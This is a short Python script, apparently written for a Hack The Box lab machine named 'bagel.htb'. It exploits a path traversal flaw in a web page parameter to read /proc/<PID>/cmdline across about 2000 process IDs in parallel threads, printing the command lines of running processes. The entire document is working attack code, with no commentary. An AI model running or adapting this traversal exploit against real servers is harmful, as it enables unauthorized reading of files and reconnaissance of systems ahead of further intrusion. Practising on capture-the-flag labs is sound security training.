import requests
import threading

thread_list = []

def call(PID):
    url = "http://bagel.htb:8000/?page=../../../../../../../"    
    payload = "/proc/{}/cmdline".format(PID)
    resp = requests.get(url + payload).text
    if (not "not found" in resp) and (resp.strip() != ""):
        print(resp)

for i in range (1, 2000):
    thread = threading.Thread(target=call, args=(i,))
    thread.start()
    thread_list.append(thread)

for thread in thread_list:
    thread.join()